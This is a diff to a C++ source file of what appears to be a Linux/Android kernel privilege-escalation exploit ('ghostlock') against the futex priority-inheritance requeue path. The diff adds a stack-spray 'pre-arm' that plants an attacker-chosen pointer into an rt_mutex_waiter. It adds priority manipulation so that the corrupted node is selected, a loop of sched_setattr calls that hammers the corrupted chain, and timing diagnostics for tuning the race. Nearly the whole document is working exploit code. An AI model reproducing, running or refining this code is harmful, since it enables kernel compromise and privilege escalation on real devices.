@@ -6,6 +6,9 @@
 
 #include "race/threads.hpp"
 
+#include <cstdlib>
+#include <cstring>
+
 #include "attack/ops.hpp"
 #include "profile/model.h"
 #include "route/route_controller.h"
@@ -35,8 +38,10 @@ namespace ghostlock::race {
                 timeout.tv_nsec -= 1000000000L;
             }
         } else {
-            uint64_t wait_ns =
-                    static_cast<uint64_t>(session::g_exploit_session.profile.race_route_wait_ms()) * 1000000ULL;
+            uint64_t wait_ms = session::g_exploit_session.profile.race_route_wait_ms();
+            if (const char *ov = getenv("GL_WAIT_MS"))
+                wait_ms = strtoull(ov, nullptr, 10);
+            uint64_t wait_ns = wait_ms * 1000000ULL;
             timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
             timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
             if (timeout.tv_nsec >= 1000000000L) {
@@ -45,10 +50,35 @@ namespace ghostlock::race {
             }
         }
         pr_info("[dbg] waiter entering WAIT_REQUEUE_PI wait_futex=%d target_futex=%d\n", race->wait_futex, race->target_futex);
+        if (const char *trap_env = getenv("GL_PRE_ARM")) {
+            /* Raise our own nice first: the proxy waiter created by the
+             * requeue inherits this (big) prio number, and after the requeue
+             * returns the main thread lowers it again, so this thread's own
+             * waiter enqueues with a smaller prio and becomes leftmost. */
+            (void) support::sched_setattr_tid(tid, 19);
+            unsigned char pre[0x200];
+            memset(pre, 0, sizeof(pre));
+            const unsigned long long trap = strtoull(trap_env, nullptr, 16);
+            if (trap) {
+                memcpy(pre + 0xe8 + 0x18, &trap, sizeof(trap));
+            }
+            pr_warning("pre-arm: trap=0x%llx -> pi_tree_entry\n", trap);
+            if (!route::punch_stack_here(pre, sizeof(pre))) {
+                pr_warning("pre-arm punch missed\n");
+            }
+            /* Nothing may syscall between the punch and the futex call. */
+        }
         race->waiter_waiting.store(1);
+        struct timespec wr0 {};
+        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wr0));
         long wr_ret = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &race->target_futex, 0);
-        pr_info("[dbg] waiter WAIT_REQUEUE_PI returned ret=%ld errno=%d\n", wr_ret, errno);
+        struct timespec wr1 {};
+        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wr1));
+        pr_info("[dbg] waiter WAIT_REQUEUE_PI returned ret=%ld errno=%d waited_ms=%lld\n",
+                wr_ret, errno,
+                static_cast<long long>((wr1.tv_sec - wr0.tv_sec) * 1000LL +
+                                       (wr1.tv_nsec - wr0.tv_nsec) / 1000000L));
         route::RouteController controller;
         controller.init(race, &session::g_exploit_session.profile);
         race->route_status = controller.execute(request);
@@ -98,9 +128,45 @@ namespace ghostlock::race {
          * through rt_mutex_start_proxy_lock()'s failure path and the buggy
          * remove_waiter() -- i.e. it is the ARM condition, not an error.  With
          * the settle the requeue returned 1 and nothing was ever armed. */
-        support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
-        race->owner_chain_done.store(1);
-        while (!race->owner_stop.load()) sleep(1);
+        if (getenv("GL_PRE_ARM")) {
+            /* Pre-arm topology: this thread must NOT PI-block on chain_futex.
+             * Without the cycle the requeue succeeds, the parked waiter is
+             * woken and enqueues its OWN rt_mutex_waiter through
+             * rt_mutex_wait_proxy_lock() -- that waiter sits in do_futex's
+             * frame at depth 0x198, i.e. inside the sigret window. */
+            race->owner_chain_done.store(1);
+        } else if (const char *ct = getenv("GL_OWNER_CHAIN_TIMEOUT_MS")) {
+            /* Diagnostic: keep the cycle alive across the requeue, then break it
+             * on a timer so this thread can go on to release the target.  If the
+             * requeue failed *after* task_blocks_on_rt_mutex() enqueued our
+             * waiter, that release wakes it immediately (-EWOULDBLOCK); if the
+             * waiter was never queued it can only time out. */
+            struct timespec deadline;
+            /* FUTEX_LOCK_PI interprets its absolute timeout against
+             * CLOCK_REALTIME (unlike FUTEX_WAIT_REQUEUE_PI, which uses
+             * CLOCK_MONOTONIC).  A monotonic deadline here is decades in the
+             * past for the realtime clock, so the call returns ETIMEDOUT
+             * immediately and the cycle never forms. */
+            SYSCHK(clock_gettime(CLOCK_REALTIME, &deadline));
+            const long long ms = strtoll(ct, nullptr, 10);
+            deadline.tv_sec += static_cast<time_t>(ms / 1000);
+            deadline.tv_nsec += static_cast<long>((ms % 1000) * 1000000L);
+            if (deadline.tv_nsec >= 1000000000L) {
+                deadline.tv_sec++;
+                deadline.tv_nsec -= 1000000000L;
+            }
+            errno = 0;
+            long chain_ret = support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0,
+                                               &deadline, nullptr, 0);
+            pr_warning("diag: owner chain lock ret=%ld errno=%d\n", chain_ret, errno);
+            race->owner_chain_done.store(1);
+        } else {
+            support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+            race->owner_chain_done.store(1);
+        }
+        while (!race->owner_stop.load()) usleep(500);
+        if (getenv("GL_UNLOCK_AFTER_FAIL"))
+            pr_warning("owner: leaving loop, unlocking target now\n");
         if (lock_target == 0)
             support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         return nullptr;
@@ -136,6 +202,8 @@ namespace ghostlock::race {
                         race->consumer_go.load() != seq)
                         break;
                     race->consumer_calls.fetch_add(1);
+                    if (calls_this_seq == 0)
+                        support::progress_marker("consumer_go"); /* other thread: safe */
                     race->consumer_inflight.store(1);
                     errno = 0;
                     /* rotate the nice every call; (calls%19)+1 is what makes
@@ -196,6 +264,10 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     while (!waiter_waiting.load() || !owner_started.load())
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
     pr_info("[route] waiter parked; owner started\n");
+    if (getenv("GL_UNLOCK_AFTER_FAIL"))
+        pr_warning("diag: settle_us=%u route_wait_ms=%u\n",
+                   session::g_exploit_session.profile.race_setup_settle_us(),
+                   session::g_exploit_session.profile.race_route_wait_ms());
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
@@ -220,6 +292,43 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     }
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
+    if (rq < 0 && getenv("GL_UNLOCK_AFTER_FAIL")) {
+        /* Decisive A/B for the 4.19 arm: if rt_mutex_start_proxy_lock() got as
+         * far as task_blocks_on_rt_mutex(), our waiter sits in the target
+         * lock's waiter tree and this unlock wakes it immediately, so its
+         * WAIT_REQUEUE_PI returns -EWOULDBLOCK (11) in a few ms.  If the
+         * -EDEADLK came from the earlier owner==task check, the waiter was
+         * never queued and it can only return after the full timeout (110). */
+        pr_warning("diag: release target right after the failed requeue\n");
+        owner_stop.store(1);
+    }
+    if (getenv("GL_PRE_ARM")) {
+        /* Shrink the waiter's prio number while it is being woken, so its own
+         * rt_mutex_waiter lands leftmost in the target lock's tree (the proxy
+         * waiter was enqueued above with the old, larger prio number). */
+        const int32_t wtid = waiter_tid.load();
+        /* 1) Drop the prio number as the very first thing after the requeue
+         *    returns.  The proxy waiter was enqueued above with the raised
+         *    (nice 19) prio; if this lands before the woken waiter reaches
+         *    rt_mutex_wait_proxy_lock(), its own rt_mutex_waiter carries a
+         *    smaller prio and becomes the lock's leftmost waiter -- which is
+         *    what makes rt_mutex_dequeue_pi() pick OUR stamped node. */
+        (void) support::sched_setattr_tid(wtid, 0);
+        /* 2) Give the woken waiter time to reach rt_mutex_wait_proxy_lock()
+         *    and park with pi_blocked_on set. */
+        usleep(500);
+        /* 3) Hammer from this thread: every nice change makes
+         *    __sched_setscheduler() call rt_mutex_adjust_prio_chain() on the
+         *    parked task, i.e. on the waiter we stamped.  Once the wait times
+         *    out rt_mutex_cleanup_proxy_lock() clears pi_blocked_on, so this
+         *    window is the only one that matters. */
+        pr_warning("pre-arm: hammering sched_setattr for the block window\n");
+        for (int32_t i = 0; i < 4000; i++) {
+            (void) support::sched_setattr_tid(wtid, (i % 19) + 1);
+            (void) support::sched_setattr_tid(wtid, 0);
+        }
+        pr_warning("pre-arm: hammer done\n");
+    }
     /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
      * the race window (observed when the Shizuku log pipe applied
      * backpressure) parks the process forever and the corrupted PI chain is
